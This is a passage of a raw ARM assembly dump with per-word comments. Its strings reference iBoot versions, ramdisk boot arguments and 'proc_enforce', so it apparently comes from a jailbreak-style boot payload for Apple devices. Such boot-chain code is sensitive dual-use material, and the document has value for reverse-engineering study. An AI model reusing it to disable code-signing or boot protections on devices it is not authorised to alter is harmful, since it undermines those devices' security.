    .word  0xE2800A01    /* 1B6C: add      r0, r0, #0x1000 */
    .word  0xE1500004    /* 1B70: cmp      r0, r4 */
    .word  0x91A01000    /* 1B74: movls    r1, r0 */
    .word  0x9AFFFFE7    /* 1B78: bls      #0x101b1c */
    .word  0xE59F202C    /* 1B7C: ldr      r2, [pc, #0x2c] */
    .word  0xE59E300C    /* 1B80: ldr      r3, [lr, #0xc] */
    .word  0xE5922000    /* 1B84: ldr      r2, [r2] */
    .word  0xE5832010    /* 1B88: str      r2, [r3, #0x10] */
    .word  0xE28DD008    /* 1B8C: add      sp, sp, #8 */
    .word  0xE8BD8010    /* 1B90: pop      {r4, pc} */
    .word  0x0010256C    /* 1B94: andseq   r2, r0, ip, ror #10 */
    .word  0x6132386E    /* 1B98: teqvs    r2, lr, ror #16 */
    .word  0x0010257C    /* 1B9C: andseq   r2, r0, ip, ror r5 */
    .word  0x00102580    /* 1BA0: andseq   r2, r0, r0, lsl #11 */
    .word  0x69626F74    /* 1BA4: stmdbvs  r2!, {r2, r4, r5, r6, r8, sb, sl, fp, sp, lr} ^ */
    .word  0x0002FFFF    /* 1BA8: .word */
    .word  0x00100230    /* 1BAC: andseq   r0, r0, r0, lsr r2 */
    .word  0x00102568    /* 1BB0: andseq   r2, r0, r8, ror #10 */
    .word  0xE59F312C    /* 1BB4: ldr      r3, [pc, #0x12c] */
    .word  0xE5933000    /* 1BB8: ldr      r3, [r3] */
    .word  0xE92D4010    /* 1BBC: push     {r4, lr} */
    .word  0xE3530000    /* 1BC0: cmp      r3, #0 */
    .word  0xE59F3120    /* 1BC4: ldr      r3, [pc, #0x120] */
    .word  0x05933000    /* 1BC8: ldreq    r3, [r3] */
    .word  0x15933000    /* 1BCC: ldrne    r3, [r3] */
    .word  0x05931000    /* 1BD0: ldreq    r1, [r3] */
    .word  0x03A02008    /* 1BD4: moveq    r2, #8 */
    .word  0x15931000    /* 1BD8: ldrne    r1, [r3] */
    .word  0x13A02010    /* 1BDC: movne    r2, #0x10 */
    .word  0x059F0108    /* 1BE0: ldreq    r0, [pc, #0x108] */
    .word  0x159F0108    /* 1BE4: ldrne    r0, [pc, #0x108] */
    .word  0xE24DD004    /* 1BE8: sub      sp, sp, #4 */
    .word  0xEBFFFAB3    /* 1BEC: bl       #0x1006c0 */
    .word  0xE59F4100    /* 1BF0: ldr      r4, [pc, #0x100] */
    .word  0xE2800001    /* 1BF4: add      r0, r0, #1 */
    .word  0xE5840000    /* 1BF8: str      r0, [r4] */
    .word  0xE59F40E8    /* 1BFC: ldr      r4, [pc, #0xe8] */
    .word  0xE5943000    /* 1C00: ldr      r3, [r4] */
    .word  0xE5930000    /* 1C04: ldr      r0, [r3] */
    .word  0xE59F30EC    /* 1C08: ldr      r3, [pc, #0xec] */
    .word  0xE5902201    /* 1C0C: ldr      r2, [r0, #0x201] */
    .word  0xE1520003    /* 1C10: cmp      r2, r3 */
    .word  0x1BFFFAF1    /* 1C14: blne     #0x1007e0 */
    .word  0xE5943000    /* 1C18: ldr      r3, [r4] */
    .word  0xE3A0200C    /* 1C1C: mov      r2, #0xc */
    .word  0xE5931000    /* 1C20: ldr      r1, [r3] */
    .word  0xE59F00D4    /* 1C24: ldr      r0, [pc, #0xd4] */
    .word  0xEBFFFAA4    /* 1C28: bl       #0x1006c0 */
    .word  0xE59F30D0    /* 1C2C: ldr      r3, [pc, #0xd0] */
    .word  0xE5931000    /* 1C30: ldr      r1, [r3] */
    .word  0xE59F30CC    /* 1C34: ldr      r3, [pc, #0xcc] */
    .word  0xE3A02008    /* 1C38: mov      r2, #8 */
    .word  0xE5830000    /* 1C3C: str      r0, [r3] */
    .word  0xEBFFFB27    /* 1C40: bl       #0x1008e4 */
    .word  0xE5943000    /* 1C44: ldr      r3, [r4] */
    .word  0xE3A02007    /* 1C48: mov      r2, #7 */
    .word  0xE5931000    /* 1C4C: ldr      r1, [r3] */
    .word  0xE59F00B4    /* 1C50: ldr      r0, [pc, #0xb4] */
    .word  0xEBFFFA99    /* 1C54: bl       #0x1006c0 */
    .word  0xE59F10B0    /* 1C58: ldr      r1, [pc, #0xb0] */
    .word  0xE2800007    /* 1C5C: add      r0, r0, #7 */
    .word  0xEBFFFB2B    /* 1C60: bl       #0x100914 */
    .word  0xE5943000    /* 1C64: ldr      r3, [r4] */
    .word  0xE3A02008    /* 1C68: mov      r2, #8 */
    .word  0xE5931000    /* 1C6C: ldr      r1, [r3] */
    .word  0xE59F009C    /* 1C70: ldr      r0, [pc, #0x9c] */
    .word  0xEBFFFA91    /* 1C74: bl       #0x1006c0 */
    .word  0xE5943000    /* 1C78: ldr      r3, [r4] */
    .word  0xE5931000    /* 1C7C: ldr      r1, [r3] */
    .word  0xE59F3090    /* 1C80: ldr      r3, [pc, #0x90] */
    .word  0xE280C001    /* 1C84: add      ip, r0, #1 */
    .word  0xE583C000    /* 1C88: str      ip, [r3] */
    .word  0xE3A02010    /* 1C8C: mov      r2, #0x10 */
    .word  0xE59F0084    /* 1C90: ldr      r0, [pc, #0x84] */
    .word  0xEBFFFA89    /* 1C94: bl       #0x1006c0 */
    .word  0xE28D3004    /* 1C98: add      r3, sp, #4 */
    .word  0xE5230004    /* 1C9C: str      r0, [r3, #-4]! */
    .word  0xE5942000    /* 1CA0: ldr      r2, [r4] */
    .word  0xE1A0000D    /* 1CA4: mov      r0, sp */
    .word  0xE5921000    /* 1CA8: ldr      r1, [r2] */
    .word  0xE3A02004    /* 1CAC: mov      r2, #4 */
    .word  0xEBFFFA82    /* 1CB0: bl       #0x1006c0 */
    .word  0xE59F3064    /* 1CB4: ldr      r3, [pc, #0x64] */
    .word  0xE5932000    /* 1CB8: ldr      r2, [r3] */
    .word  0xE59F3060    /* 1CBC: ldr      r3, [pc, #0x60] */
    .word  0xE590C004    /* 1CC0: ldr      ip, [r0, #4] */
    .word  0xE5901008    /* 1CC4: ldr      r1, [r0, #8] */
    .word  0xE5823004    /* 1CC8: str      r3, [r2, #4] */
    .word  0xE59F3054    /* 1CCC: ldr      r3, [pc, #0x54] */
    .word  0xE5831000    /* 1CD0: str      r1, [r3] */
    .word  0xE59F3050    /* 1CD4: ldr      r3, [pc, #0x50] */
    .word  0xE583C000    /* 1CD8: str      ip, [r3] */
    .word  0xEBFFF91D    /* 1CDC: bl       #0x100158 */
    .word  0xE28DD004    /* 1CE0: add      sp, sp, #4 */
    .word  0xE8BD8010    /* 1CE4: pop      {r4, pc} */
    .word  0x00102538    /* 1CE8: andseq   r2, r0, r8, lsr r5 */
    .word  0x0010256C    /* 1CEC: andseq   r2, r0, ip, ror #10 */
    .word  0x001023C0    /* 1CF0: andseq   r2, r0, r0, asr #7 */
    .word  0x001023B0    /* 1CF4: ldrheq   r2, [r0], -r0 */
    .word  0x00102520    /* 1CF8: andseq   r2, r0, r0, lsr #10 */
    .word  0x6E696152    /* 1CFC: mcrvs    p1, #3, r6, c9, c2, #2 */
    .word  0x001023C8    /* 1D00: andseq   r2, r0, r8, asr #7 */
    .word  0x001001D0    /* 1D04: ldrsbeq  r0, [r0], -r0 */
    .word  0x001002C0    /* 1D08: andseq   r0, r0, r0, asr #5 */
    .word  0x00101D50    /* 1D0C: andseq   r1, r0, r0, asr sp */
    .word  0x00101D58    /* 1D10: andseq   r1, r0, r8, asr sp */
    .word  0x001023D4    /* 1D14: ldrsbeq  r2, [r0], -r4 */
    .word  0x00102554    /* 1D18: andseq   r2, r0, r4, asr r5 */
    .word  0x00101D64    /* 1D1C: andseq   r1, r0, r4, ror #26 */
    .word  0x00100230    /* 1D20: andseq   r0, r0, r0, lsr r2 */
    .word  0x001013B4    /* 1D24: ldrheq   r1, [r0], -r4 */
    .word  0x00102544    /* 1D28: andseq   r2, r0, r4, asr #10 */
    .word  0x00102578    /* 1D2C: andseq   r2, r0, r8, ror r5 */
    .word  0xE1830803    /* 1D30: orr      r0, r3, r3, lsl #16 */
    .word  0xE12FFF1E    /* 1D34: bx       lr */

/* ----- str_iboot_240 @ 0x1D38 ----- */
str_iboot_240:
    .word  0x6F6F4269    /* 1D38: str_iboot_240 iBoo */
    .word  0x34322D74    /* 1D3C: t-24 */
    .word  0x00342E30    /* 1D40: 0.4. */

/* ----- str_iboot_359 @ 0x1D44 ----- */
str_iboot_359:
    .word  0x6F6F4269    /* 1D44: str_iboot_359 iBoo */
    .word  0x35332D74    /* 1D48: t-35 */
    .word  0x00332E39    /* 1D4C: 9.3. */

/* ----- str_rd_md0 @ 0x1D50 ----- */
str_rd_md0:
    .word  0x6D3D6472    /* 1D50: str_rd_md0 rd=m */
    .word  0x00203064    /* 1D54: d0 . */

/* ----- str_progress @ 0x1D58 ----- */
str_progress:
    .word  0x6F72702D    /* 1D58: str_progress -pro */
    .word  0x73657267    /* 1D5C: gres */
    .word  0x00000073    /* 1D60: s... */

/* ----- str_ramdisk_too_large @ 0x1D64 ----- */
str_ramdisk_too_large:
    .word  0x646D6152    /* 1D64: str_ramdisk_too_large Ramd */
    .word  0x206B7369    /* 1D68: isk  */
    .word  0x206F6F74    /* 1D6C: too  */
    .word  0x6772616C    /* 1D70: larg */
    .word  0x00000065    /* 1D74: e... */

/* ----- str_magic_crib @ 0x1D78 ----- */
str_magic_crib:
    .word  0x6967616D    /* 1D78: str_magic_crib magi */
    .word  0x74732063    /* 1D7C: c st */
    .word  0x676E6972    /* 1D80: ring */
    .word  0x206F7420    /* 1D84:  to  */
    .word  0x62697263    /* 1D88: crib */
    .word  0x00242340    /* 1D8C: @#$. */
    .word  0x02000112    /* 1D90: .... */
    .word  0x40000000    /* 1D94: ...@ */
    .word  0x00000000    /* 1D98: .... */
    .word  0x00000000    /* 1D9C: .... */
    .word  0x060A0100    /* 1DA0: .... */
    .word  0x00000200    /* 1DA4: .... */
    .word  0x00014000    /* 1DA8: .@.. */
    .word  0x2202401C    /* 1DAC: .@." */
    .word  0x2202401C    /* 1DB0: .@." */
    .word  0x00000904    /* 1DB4: .... */
    .word  0x2202402C    /* 1DB8: ,@." */
    .word  0x7461736B    /* 1DBC: ksat */
    .word  0x00000000    /* 1DC0: .... */
    .word  0x00000000    /* 1DC4: .... */
    .word  0x00000000    /* 1DC8: .... */
    .word  0x00000000    /* 1DCC: .... */
    .word  0x00000002    /* 1DD0: .... */
    .word  0x00000001    /* 1DD4: .... */
    .word  0x00000000    /* 1DD8: .... */
    .word  0x00000000    /* 1DDC: .... */
    .word  0x00000000    /* 1DE0: .... */
    .word  0x00000000    /* 1DE4: .... */
    .word  0x00000000    /* 1DE8: .... */
    .word  0x00000000    /* 1DEC: .... */
    .word  0x00000000    /* 1DF0: .... */
    .word  0x00000000    /* 1DF4: .... */
    .word  0x00000000    /* 1DF8: .... */
    .word  0x00000000    /* 1DFC: .... */
    .word  0x00000000    /* 1E00: .... */
    .word  0x00000000    /* 1E04: .... */
    .word  0x00000000    /* 1E08: .... */
    .word  0x00000000    /* 1E0C: .... */
    .word  0x00000000    /* 1E10: .... */
    .word  0x00000000    /* 1E14: .... */
    .word  0x00000000    /* 1E18: .... */
    .word  0x00000000    /* 1E1C: .... */
    .word  0x00000000    /* 1E20: .... */
    .word  0x00000000    /* 1E24: .... */
    .word  0x00000000    /* 1E28: .... */
    .word  0x00000000    /* 1E2C: .... */
    .word  0x00000000    /* 1E30: .... */
    .word  0x00000000    /* 1E34: .... */
    .word  0x00000000    /* 1E38: .... */
    .word  0x746F6F62    /* 1E3C: boot */
    .word  0x61727473    /* 1E40: stra */
    .word  0x00000070    /* 1E44: p... */
    .word  0x00000000    /* 1E48: .... */
    .word  0x74736B32    /* 1E4C: 2kst */
    .word  0x220240C0    /* 1E50: .@." */
    .word  0x220240C0    /* 1E54: .@." */
    .word  0x220240C8    /* 1E58: .@." */
    .word  0x220240C8    /* 1E5C: .@." */
    .word  0x22025384    /* 1E60: .S." */
    .word  0x38000000    /* 1E64: ...8 */
    .word  0x38000004    /* 1E68: ...8 */
    .word  0x38000008    /* 1E6C: ...8 */
    .word  0x3800000C    /* 1E70: ...8 */
    .word  0x38000010    /* 1E74: ...8 */
    .word  0x38000020    /* 1E78:  ..8 */
    .word  0x38000024    /* 1E7C: $..8 */
    .word  0x38000028    /* 1E80: (..8 */
    .word  0x3800002C    /* 1E84: ,..8 */
    .word  0x38000030    /* 1E88: 0..8 */
    .word  0x2202FDFC    /* 1E8C: ..." */
    .word  0x38000044    /* 1E90: D..8 */
    .word  0x38000048    /* 1E94: H..8 */
    .word  0x3800004C    /* 1E98: L..8 */
    .word  0x38000050    /* 1E9C: P..8 */
    .word  0x38000054    /* 1EA0: T..8 */
    .word  0x38000058    /* 1EA4: X..8 */
    .word  0x3800005C    /* 1EA8: \..8 */
    .word  0x38000060    /* 1EAC: `..8 */
    .word  0x38000064    /* 1EB0: d..8 */
    .word  0x38000068    /* 1EB4: h..8 */
    .word  0x3800006C    /* 1EB8: l..8 */
    .word  0x38000070    /* 1EBC: p..8 */
    .word  0x38000074    /* 1EC0: t..8 */
    .word  0x38000078    /* 1EC4: x..8 */
    .word  0x3800007C    /* 1EC8: |..8 */
    .word  0x38000080    /* 1ECC: ...8 */
    .word  0x38000084    /* 1ED0: ...8 */
    .word  0x3800008C    /* 1ED4: ...8 */
    .word  0x00000001    /* 1ED8: .... */
    .word  0x00000000    /* 1EDC: .... */
    .word  0x00000000    /* 1EE0: .... */
    .word  0x00000000    /* 1EE4: .... */
    .word  0x00000000    /* 1EE8: .... */
    .word  0x00000000    /* 1EEC: .... */
    .word  0x00000000    /* 1EF0: .... */
    .word  0x00000000    /* 1EF4: .... */
    .word  0x00000000    /* 1EF8: .... */
    .word  0x00000000    /* 1EFC: .... */
    .word  0x00000000    /* 1F00: .... */
    .word  0x00000000    /* 1F04: .... */
    .word  0x00000000    /* 1F08: .... */
    .word  0x00000000    /* 1F0C: .... */
    .word  0x00000000    /* 1F10: .... */
    .word  0x00000000    /* 1F14: .... */
    .word  0x00000000    /* 1F18: .... */
    .word  0x00000000    /* 1F1C: .... */
    .word  0x00000000    /* 1F20: .... */
    .word  0x00000000    /* 1F24: .... */
    .word  0x00000000    /* 1F28: .... */
    .word  0x00000000    /* 1F2C: .... */
    .word  0x00000000    /* 1F30: .... */
    .word  0x00000000    /* 1F34: .... */
    .word  0x00000000    /* 1F38: .... */
    .word  0x00000000    /* 1F3C: .... */
    .word  0x00000000    /* 1F40: .... */
    .word  0x00000000    /* 1F44: .... */
    .word  0x00000000    /* 1F48: .... */
    .word  0x00000000    /* 1F4C: .... */
    .word  0x00000000    /* 1F50: .... */
    .word  0x00000000    /* 1F54: .... */
    .word  0x00000000    /* 1F58: .... */
    .word  0x00000000    /* 1F5C: .... */
    .word  0x00000000    /* 1F60: .... */
    .word  0x00000000    /* 1F64: .... */
    .word  0x00000000    /* 1F68: .... */
    .word  0x00000000    /* 1F6C: .... */
    .word  0x00000000    /* 1F70: .... */
    .word  0x00000000    /* 1F74: .... */
    .word  0x00000000    /* 1F78: .... */
    .word  0x00000000    /* 1F7C: .... */
    .word  0x00000000    /* 1F80: .... */
    .word  0x00000000    /* 1F84: .... */
    .word  0x00000000    /* 1F88: .... */
    .word  0x00000000    /* 1F8C: .... */
    .word  0x00000000    /* 1F90: .... */
    .word  0x02000112    /* 1F94: .... */
    .word  0x40000000    /* 1F98: ...@ */
    .word  0x00000000    /* 1F9C: .... */
    .word  0x00000000    /* 1FA0: .... */
    .word  0x060A0100    /* 1FA4: .... */
    .word  0x00000200    /* 1FA8: .... */
    .word  0x00014000    /* 1FAC: .@.. */
    .word  0x84024020    /* 1FB0:  @.. */
    .word  0x84024020    /* 1FB4:  @.. */
    .word  0x00000904    /* 1FB8: .... */
    .word  0x84024030    /* 1FBC: 0@.. */
    .word  0x7461736B    /* 1FC0: ksat */
    .word  0x00000000    /* 1FC4: .... */
    .word  0x00000000    /* 1FC8: .... */
    .word  0x00000000    /* 1FCC: .... */
    .word  0x00000000    /* 1FD0: .... */
    .word  0x00000002    /* 1FD4: .... */
    .word  0x00000001    /* 1FD8: .... */
    .word  0x00000000    /* 1FDC: .... */
    .word  0x00000000    /* 1FE0: .... */
    .word  0x00000000    /* 1FE4: .... */
    .word  0x00000000    /* 1FE8: .... */
    .word  0x00000000    /* 1FEC: .... */
    .word  0x00000000    /* 1FF0: .... */
    .word  0x00000000    /* 1FF4: .... */
    .word  0x00000000    /* 1FF8: .... */
    .word  0x00000000    /* 1FFC: .... */
    .word  0x00000000    /* 2000: .... */
    .word  0x00000000    /* 2004: .... */
    .word  0x00000000    /* 2008: .... */
    .word  0x00000000    /* 200C: .... */
    .word  0x00000000    /* 2010: .... */
    .word  0x00000000    /* 2014: .... */
    .word  0x00000000    /* 2018: .... */
    .word  0x00000000    /* 201C: .... */
    .word  0x00000000    /* 2020: .... */
    .word  0x00000000    /* 2024: .... */
    .word  0x00000000    /* 2028: .... */
    .word  0x00000000    /* 202C: .... */
    .word  0x00000000    /* 2030: .... */
    .word  0x00000000    /* 2034: .... */
    .word  0x00000000    /* 2038: .... */
    .word  0x00000000    /* 203C: .... */
    .word  0x746F6F62    /* 2040: boot */
    .word  0x61727473    /* 2044: stra */
    .word  0x00000070    /* 2048: p... */
    .word  0x00000000    /* 204C: .... */
    .word  0x74736B32    /* 2050: 2kst */
    .word  0x840240C4    /* 2054: .@.. */
    .word  0x840240C4    /* 2058: .@.. */
    .word  0x840240CC    /* 205C: .@.. */
    .word  0x840240CC    /* 2060: .@.. */
    .word  0x80100000    /* 2064: .... */
    .word  0x80100004    /* 2068: .... */
    .word  0x80100008    /* 206C: .... */
    .word  0x8010000C    /* 2070: .... */
    .word  0x80100010    /* 2074: .... */
    .word  0x80100020    /* 2078:  ... */
    .word  0x80100024    /* 207C: $... */
    .word  0x80100028    /* 2080: (... */
    .word  0x8010002C    /* 2084: ,... */
    .word  0x80100030    /* 2088: 0... */
    .word  0x84033DF0    /* 208C: .=.. */
    .word  0x80100044    /* 2090: D... */
    .word  0x80100048    /* 2094: H... */
    .word  0x8010004C    /* 2098: L... */
    .word  0x80100050    /* 209C: P... */
    .word  0x80100054    /* 20A0: T... */
    .word  0x80100058    /* 20A4: X... */
    .word  0x8010005C    /* 20A8: \... */
    .word  0x80100060    /* 20AC: `... */
    .word  0x80100064    /* 20B0: d... */
    .word  0x80100068    /* 20B4: h... */
    .word  0x8010006C    /* 20B8: l... */
    .word  0x80100070    /* 20BC: p... */
    .word  0x80100074    /* 20C0: t... */
    .word  0x80100078    /* 20C4: x... */
    .word  0x8010007C    /* 20C8: |... */
    .word  0x80100080    /* 20CC: .... */
    .word  0x80100084    /* 20D0: .... */
    .word  0x8010008C    /* 20D4: .... */
    .word  0x00000001    /* 20D8: .... */
    .word  0x00000000    /* 20DC: .... */
    .word  0x00000000    /* 20E0: .... */
    .word  0x00000000    /* 20E4: .... */
    .word  0x00000000    /* 20E8: .... */
    .word  0x00000000    /* 20EC: .... */
    .word  0x00000000    /* 20F0: .... */
    .word  0x00000000    /* 20F4: .... */
    .word  0x00000000    /* 20F8: .... */
    .word  0x00000000    /* 20FC: .... */
    .word  0x00000000    /* 2100: .... */
    .word  0x00000000    /* 2104: .... */
    .word  0x00000000    /* 2108: .... */
    .word  0x00000000    /* 210C: .... */
    .word  0x00000000    /* 2110: .... */
    .word  0x00000000    /* 2114: .... */
    .word  0x00000000    /* 2118: .... */
    .word  0x00000000    /* 211C: .... */
    .word  0x00000000    /* 2120: .... */
    .word  0x00000000    /* 2124: .... */
    .word  0x00000000    /* 2128: .... */
    .word  0x00000000    /* 212C: .... */
    .word  0x00000000    /* 2130: .... */
    .word  0x00000000    /* 2134: .... */
    .word  0x00000000    /* 2138: .... */
    .word  0x00000000    /* 213C: .... */
    .word  0x00000000    /* 2140: .... */
    .word  0x00000000    /* 2144: .... */
    .word  0x00000000    /* 2148: .... */
    .word  0x00000000    /* 214C: .... */
    .word  0x00000000    /* 2150: .... */
    .word  0x00000000    /* 2154: .... */
    .word  0x00000000    /* 2158: .... */
    .word  0x00000000    /* 215C: .... */
    .word  0x00000000    /* 2160: .... */
    .word  0x00000000    /* 2164: .... */
    .word  0x00000000    /* 2168: .... */
    .word  0x00000000    /* 216C: .... */
    .word  0x00000000    /* 2170: .... */
    .word  0x00000000    /* 2174: .... */
    .word  0x00000000    /* 2178: .... */
    .word  0x00000000    /* 217C: .... */
    .word  0x00000000    /* 2180: .... */
    .word  0x00000000    /* 2184: .... */
    .word  0x00000000    /* 2188: .... */
    .word  0x00000000    /* 218C: .... */
    .word  0x00000000    /* 2190: .... */
    .word  0x02000112    /* 2194: .... */
    .word  0x40000000    /* 2198: ...@ */
    .word  0x00000000    /* 219C: .... */
    .word  0x00000000    /* 21A0: .... */
    .word  0x060A0100    /* 21A4: .... */
    .word  0x00000200    /* 21A8: .... */
    .word  0x00014000    /* 21AC: .@.. */
    .word  0x84024020    /* 21B0:  @.. */
    .word  0x84024020    /* 21B4:  @.. */
    .word  0x00000904    /* 21B8: .... */
    .word  0x84024030    /* 21BC: 0@.. */
    .word  0x7461736B    /* 21C0: ksat */
    .word  0x00000000    /* 21C4: .... */
    .word  0x00000000    /* 21C8: .... */
    .word  0x00000000    /* 21CC: .... */
    .word  0x00000000    /* 21D0: .... */
    .word  0x00000002    /* 21D4: .... */
    .word  0x00000001    /* 21D8: .... */
    .word  0x00000000    /* 21DC: .... */
    .word  0x00000000    /* 21E0: .... */
    .word  0x00000000    /* 21E4: .... */
    .word  0x00000000    /* 21E8: .... */
    .word  0x00000000    /* 21EC: .... */
    .word  0x00000000    /* 21F0: .... */
    .word  0x00000000    /* 21F4: .... */
    .word  0x00000000    /* 21F8: .... */
    .word  0x00000000    /* 21FC: .... */
    .word  0x00000000    /* 2200: .... */
    .word  0x00000000    /* 2204: .... */
    .word  0x00000000    /* 2208: .... */
    .word  0x00000000    /* 220C: .... */
    .word  0x00000000    /* 2210: .... */
    .word  0x00000000    /* 2214: .... */
    .word  0x00000000    /* 2218: .... */
    .word  0x00000000    /* 221C: .... */
    .word  0x00000000    /* 2220: .... */
    .word  0x00000000    /* 2224: .... */
    .word  0x00000000    /* 2228: .... */
    .word  0x00000000    /* 222C: .... */
    .word  0x00000000    /* 2230: .... */
    .word  0x00000000    /* 2234: .... */
    .word  0x00000000    /* 2238: .... */
    .word  0x00000000    /* 223C: .... */
    .word  0x746F6F62    /* 2240: boot */
    .word  0x61727473    /* 2244: stra */
    .word  0x00000070    /* 2248: p... */
    .word  0x00000000    /* 224C: .... */
    .word  0x74736B32    /* 2250: 2kst */
    .word  0x840240C4    /* 2254: .@.. */
    .word  0x840240C4    /* 2258: .@.. */
    .word  0x840240CC    /* 225C: .@.. */
    .word  0x840240CC    /* 2260: .@.. */
    .word  0x00000001    /* 2264: .... */
    .word  0x00000003    /* 2268: .... */
    .word  0x00000003    /* 226C: .... */
    .word  0x00000003    /* 2270: .... */
    .word  0x00000003    /* 2274: .... */
    .word  0x00000003    /* 2278: .... */
    .word  0x00000003    /* 227C: .... */
    .word  0x00000300    /* 2280: .... */
    .word  0x00000300    /* 2284: .... */
    .word  0x00000003    /* 2288: .... */
    .word  0x00000300    /* 228C: .... */
    .word  0x00000300    /* 2290: .... */
    .word  0x00000300    /* 2294: .... */
    .word  0x00000300    /* 2298: .... */
    .word  0x00000300    /* 229C: .... */
    .word  0x00000301    /* 22A0: .... */
    .word  0x00000300    /* 22A4: .... */
    .word  0x00000300    /* 22A8: .... */
    .word  0x00000300    /* 22AC: .... */
    .word  0x00000301    /* 22B0: .... */
    .word  0x00000300    /* 22B4: .... */
    .word  0x00000300    /* 22B8: .... */
    .word  0x00000300    /* 22BC: .... */
    .word  0x00000300    /* 22C0: .... */
    .word  0x00000300    /* 22C4: .... */
    .word  0x00000300    /* 22C8: .... */
    .word  0x00000701    /* 22CC: .... */
    .word  0x00000300    /* 22D0: .... */
    .word  0x00000300    /* 22D4: .... */
    .word  0x00000300    /* 22D8: .... */
    .word  0x00000300    /* 22DC: .... */
    .word  0x00000701    /* 22E0: .... */
    .word  0x00000300    /* 22E4: .... */
    .word  0x00000300    /* 22E8: .... */
    .word  0x00000300    /* 22EC: .... */
    .word  0x00000300    /* 22F0: .... */
    .word  0x00000300    /* 22F4: .... */
    .word  0x00000300    /* 22F8: .... */
    .word  0x00000300    /* 22FC: .... */
    .word  0x00000300    /* 2300: .... */
    .word  0x00070101    /* 2304: .... */
    .word  0x00000300    /* 2308: .... */
    .word  0x00000300    /* 230C: .... */
    .word  0x00000300    /* 2310: .... */
    .word  0x00000300    /* 2314: .... */
    .word  0x00000300    /* 2318: .... */
    .word  0x00000300    /* 231C: .... */
    .word  0x00000300    /* 2320: .... */
    .word  0x00000300    /* 2324: .... */
    .word  0x00000300    /* 2328: .... */
    .word  0x83100800    /* 232C: .... */
    .word  0x83100000    /* 2330: .... */
    .word  0x80100000    /* 2334: .... */
    .word  0x80100004    /* 2338: .... */
    .word  0x80100008    /* 233C: .... */
    .word  0x8010000C    /* 2340: .... */
    .word  0x80100010    /* 2344: .... */
    .word  0x80100020    /* 2348:  ... */
    .word  0x80100024    /* 234C: $... */
    .word  0x80100028    /* 2350: (... */
    .word  0x8010002C    /* 2354: ,... */
    .word  0x80100030    /* 2358: 0... */
    .word  0x84033DEC    /* 235C: .=.. */
    .word  0x80100044    /* 2360: D... */
    .word  0x80100048    /* 2364: H... */
    .word  0x8010004C    /* 2368: L... */
    .word  0x80100050    /* 236C: P... */
    .word  0x80100054    /* 2370: T... */
    .word  0x80100058    /* 2374: X... */
    .word  0x8010005C    /* 2378: \... */
    .word  0x80100060    /* 237C: `... */
    .word  0x80100064    /* 2380: d... */
    .word  0x80100068    /* 2384: h... */
    .word  0x8010006C    /* 2388: l... */
    .word  0x80100070    /* 238C: p... */
    .word  0xB580B40F    /* 2390: .... */
    .word  0xB081AF00    /* 2394: .... */
    .word  0xFFFFFF06    /* 2398: .... */
    .word  0xE00568FF    /* 239C: .h.. */
    .word  0xAF02B5B0    /* 23A0: .... */
    .word  0xFF1DB082    /* 23A4: .... */
    .word  0x68134A02    /* 23A8: .J.h */
    .word  0x60104318    /* 23AC: .C.` */
    .word  0x4646B5F0    /* 23B0: ..FF */
    .word  0xAF04B440    /* 23B4: @... */
    .word  0x1C05B081    /* 23B8: .... */
    .word  0x1C1C1C16    /* 23BC: .... */
    .word  0xAF01B590    /* 23C0: .... */
    .word  0xF013B083    /* 23C4: .... */
    .word  0xAFFFB5FF    /* 23C8: .... */
    .word  0xFF15FF04    /* 23CC: .... */
    .word  0xF7FFFF0E    /* 23D0: .... */
    .word  0xAFFFB5FF    /* 23D4: .... */
    .word  0xF0FF4811    /* 23D8: .H.. */

/* ----- str_fsboot @ 0x23DC ----- */
str_fsboot:
    .word  0x6F627366    /* 23DC: str_fsboot fsbo */
    .word  0x0000746F    /* 23E0: ot.. */

/* ----- str_proc_enforce @ 0x23E4 ----- */
str_proc_enforce:
    .word  0x636F7270    /* 23E4: str_proc_enforce proc */
    .word  0x666E655F    /* 23E8: _enf */
    .word  0x6563726F    /* 23EC: orce */
    .word  0x00000000    /* 23F0: .... */

/* ----- str_bootx @ 0x23F4 ----- */
str_bootx:
    .word  0x746F6F62    /* 23F4: str_bootx boot */
    .word  0xB5900078    /* 23F8: x... */
    .word  0x4B13AF01    /* 23FC: ...K */
    .word  0x4798681B    /* 2400: .h.G */
    .word  0x2400B100    /* 2404: ...$ */
    .word  0xBD904620    /* 2408:  F.. */
    .word  0xE12FFF33    /* 240C: 3./. */
    .word  0xE3500000    /* 2410: ..P. */
    .word  0x0A000000    /* 2414: .... */
    .word  0xE3A04000    /* 2418: .@.. */
    .word  0xE1A00004    /* 241C: .... */

/* ----- device_table @ 0x2420 ----- */
device_table:
    .word  0x4FF00000    /* 2420: device_table ...O */
    .word  0x84000000    /* 2424: .... */
    .word  0x41000000    /* 2428: ...A */
    .word  0xBF200000    /* 242C: .. . */
    .word  0x00004000    /* 2430: .@.. */
    .word  0x18000000    /* 2434: .... */
    .word  0x22000000    /* 2438: ..." */
    .word  0x09000000    /* 243C: .... */
    .word  0x38E00000    /* 2440: ...8 */
    .word  0x00080000    /* 2444: .... */
    .word  0x0FF00000    /* 2448: .... */
    .word  0x22000000    /* 244C: ..." */
    .word  0x09000000    /* 2450: .... */
    .word  0x38E00000    /* 2454: ...8 */
    .word  0xFFFFF1FF    /* 2458: .... */
    .word  0x2001BF18    /* 245C: ...  */
    .word  0x0D00F1A7    /* 2460: .... */
    .word  0x43983801    /* 2464: .8.C */
    .word  0x23010FC0    /* 2468: ...# */
    .word  0x69284058    /* 246C: X@(i */
    .word  0x0F02F010    /* 2470: .... */
    .word  0xFFFFF0FF    /* 2474: .... */
    .word  0xF0FF2001    /* 2478: . .. */
    .word  0x2800FFFF    /* 247C: ...( */
    .word  0x07816928    /* 2480: (i.. */
    .word  0xE08CD500    /* 2484: .... */
    .word  0xF0FF2001    /* 2488: . .. */
    .word  0x2800FFFF    /* 248C: ...( */
    .word  0x4FF005F9    /* 2490: ...O */
    .word  0x4FF1D3F9    /* 2494: ...O */
    .word  0x4FF02801    /* 2498: .(.O */
    .word  0x4FF0264D    /* 249C: M&.O */
    .word  0x4FF02565    /* 24A0: e%.O */
    .word  0x465EB5F0    /* 24A4: ..^F */
    .word  0x46444655    /* 24A8: UFDF */
    .word  0xAF06B470    /* 24AC: p... */
    .word  0x4680B09A    /* 24B0: ...F */
    .word  0x00000000    /* 24B4: .... */
    .word  0x00000000    /* 24B8: .... */
    .word  0x00000000    /* 24BC: .... */
    .word  0xE6A0E500    /* 24C0: .... */
    .word  0x66AE6F52    /* 24C4: Ro.f */
    .word  0xD4C6C1C5    /* 24C8: .... */
    .word  0x80616DF1    /* 24CC: .ma. */
